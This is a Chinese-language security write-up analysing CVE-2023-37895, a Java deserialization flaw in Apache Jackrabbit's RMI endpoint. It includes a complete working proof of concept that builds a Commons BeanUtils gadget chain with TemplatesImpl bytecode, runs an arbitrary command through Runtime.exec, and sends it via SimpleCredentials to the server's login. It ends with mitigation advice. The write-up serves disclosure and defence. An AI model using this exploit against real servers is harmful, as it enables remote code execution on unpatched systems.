

# 奇安信攻防社区-Apache Jackrabbit 反序列化漏洞分析（CVE-2023-37895）

### Apache Jackrabbit 反序列化漏洞分析（CVE-2023-37895）

Apache Jackrabbit 反序列化漏洞分析（CVE-2023-37895）

# 漏洞分析

Apache Jackrabbit是一个开源的内容仓库,它实现了JCR(Java Contents Repository) API规范。

JCR是一个用于内容仓库的Java API,它为内容仓库定义了一套标准接口,以便应用程序可以通过这些标准接口访问不同的内容仓库实现。

Jackrabbit通过这些JCR接口提供了一系列内容仓库功能,比如层次结构节点管理、版本控制、 Observation、查询、锁定、事务等。它广泛用于JavaEE应用中需要内容仓库功能的场景。

Jackrabbit的/rmi路径下提供了RMI服务,这可以使远程客户端通过RMI协议访问Jackrabbit服务器端的内容仓库。客户端可以获取 Repository 对象后,就可以通过JCR API对内容仓库进行操作。

通过web.xml得到`/rmi`的Servlet为`org.apache.jackrabbit.servlet.remote.RemoteBindingServlet`

![image-20230727155734831](assets/1705470930-7e3beeca5e5d72d24b3d7835c1810231.png)

![image-20230727160138191](assets/1705470930-c7cada83b3295bb67f74cf0b25595ccb.png)

这里直接通过`RemoteBindingServlet` 的 `getRemoteRepository()` 方法获取Repository对象，然后转化为Stub代理对象返回给Response。

跟进看看具体逻辑

![image-20230727160329701](assets/1705470930-bd6a88c850d6030d6f40eab6aed3c2a4.png)

这里调用 `getRemoteAdapterFactory()` 获取 `RemoteAdapterFactory` 实例,默认是`ServerAdapterFactory`

然后调用 `ServerAdapterFactory` 的 `getRemoteRepository()` 方法获取Repository对象

![image-20230727160536822](assets/1705470930-85fddf0b213d97064a2a828b1e7b2d79.png)

当客户端获取到Repository对象后，可以调用Repository的login函数

![image-20230727160726345](assets/1705470930-6f8a6a88b026deacf9f0bd2896128816.png)

跟进到实现类

![image-20230727160806040](assets/1705470930-51d56c664cdc4f2e941ac7ae7cfcd594.png)

继续跟进

![image-20230727160908206](assets/1705470930-7cd3d14ec6c5612cae27714f2dd0ecda.png)

最后通过RMI将客户端的Credentials类传输到了服务端，其中用的RMI底层的JRMP协议，将客户端序列化后，将序列化数据传输到服务端后再反序列化。如果我们传输的一个恶意Credentials对象，则会执行相关的一些恶意代码

![image-20230727160938886](assets/1705470930-5889513b04cf8c934a41db5c431a1d52.png)

该项目包含了Commons BeanUtils组件，可利用Commons BeanUtils链构造恶意Credentials对象

![image-20230727161306272](assets/1705470930-55ea3e99737b7a1aba6e6f7576732da0.png)

而Credentials是一个继承`Serializable`的空接口

![image-20230727161402220](assets/1705470930-5f8b5a0498ec420170d0d777efa44686.png)

我们看到4个实现之一的`SimpleCredentials`类，可以用这个类来封装Commons BeanUtils攻击链

![image-20230727161437617](assets/1705470930-61511a94026cf39611d0e33148972fb4.png)

SimpleCredentials类中的attributes属性是一个Map:

private Map<String,Object> attributes \\= new HashMap<String,Object>();

它被声明为可以存储任意Object类型对象。我们通过setAttribute()方法将构造的恶意PriorityQueue对象存放到这个attributes Map中

SimpleCredentials exp \\= new SimpleCredentials("admin","admin".toCharArray());  
exp.setAttribute("admin",payload);

当反序列化包含恶意PriorityQueue的SimpleCredentials对象时，会递归反序列化它的所有属性，其中就包含了attributes这个Map，反序列化attributes时,也会反序列化其中存放的PriorityQueue对象，这样就会触发PriorityQueue对象中的反序列化逻辑，实现RCE

# 漏洞复现

POC：

package org.example;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.beanutils.BeanComparator;  
import java.lang.reflect.Field;  
import java.util.PriorityQueue;  
​  
import org.apache.jackrabbit.rmi.repository.URLRemoteRepository;  
import javax.jcr.Repository;  
import javax.jcr.SimpleCredentials;  
import static org.example.TemplatesImpl.getTemplatesImpl;  
​  
public class Exp {  
public static void main(String\[\] args) throws Exception {  
byte\[\] code \\= getTemplatesImpl("open -a calculator");  
byte\[\]\[\] codes \\= {code};  
TemplatesImpl obj \\= new TemplatesImpl();  
setFieldValue(obj, "\_bytecodes",codes);  
setFieldValue(obj, "\_name", "aaaa");  
setFieldValue(obj, "\_tfactory", new TransformerFactoryImpl());  
BeanComparator comparator \\= new BeanComparator(null,String.CASE\_INSENSITIVE\_ORDER);  
final PriorityQueue<Object> payload \\= new PriorityQueue<Object>(2, comparator);  
payload.add("1");  
payload.add("1");  
setFieldValue(comparator, "property", "outputProperties");  
setFieldValue(payload, "queue", new Object\[\]{obj, obj});  
​  
​  
SimpleCredentials exp \\= new SimpleCredentials("admin","admin".toCharArray());  
exp.setAttribute("admin",payload);  
Repository repository \\= new URLRemoteRepository("[http://localhost:8080/rmi](http://localhost:8080/rmi)");  
repository.login(exp);  
}  
​  
public static void setFieldValue(Object target, String name, Object value) throws Exception {  
Class c \\= target.getClass();  
Field field \\= c.getDeclaredField(name);  
field.setAccessible(true);  
field.set(target,value);  
}  
}  
​  
​

TemplatesImpl类

package org.example;  
​  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.CtConstructor;  
​  
public class TemplatesImpl {  
public static byte\[\] getTemplatesImpl(String cmd) {  
try {  
ClassPool pool \\= ClassPool.getDefault();  
CtClass ctClass \\= pool.makeClass("Evil");  
CtClass superClass \\= pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
ctClass.setSuperclass(superClass);  
CtConstructor constructor \\= ctClass.makeClassInitializer();  
constructor.setBody(" try {\\n" +  
" Runtime.getRuntime().exec(\\"" + cmd +  
"\\");\\n" +  
" } catch (Exception ignored) {\\n" +  
" }");  
byte\[\] bytes \\= ctClass.toBytecode();  
ctClass.defrost();  
return bytes;  
} catch (Exception e) {  
e.printStackTrace();  
return new byte\[\]{};  
}  
}  
}

运行POC:

![image-20230731114549831](assets/1705470930-cce2b6e9d61cb78c78b96686a6dc12bc.png)

# 处置建议

-   使用网络ACL限制访问 JackRabbit 的来源，而且建议如非必要，不要将 JackRabbit 暴露在互联网上
-   官方补丁链接:[https://github.com/apache/jackrabbit/tags](https://github.com/apache/jackrabbit/tags)
